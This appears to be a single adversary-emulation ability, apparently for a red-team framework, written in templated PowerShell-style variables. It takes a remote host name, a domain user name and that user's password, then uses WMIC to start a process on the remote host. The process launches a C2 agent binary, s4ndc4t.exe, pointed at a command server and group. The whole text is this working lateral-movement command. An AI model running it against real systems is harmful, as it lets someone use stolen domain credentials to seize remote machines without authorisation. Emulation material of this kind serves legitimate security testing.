$node = '''#{remote.host.fqdn}''';
$user = '''#{domain.user.name}''';
$password = '''#{domain.user.password}''';
wmic /node:$node /user:$user /password:$password process call create "cmd.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
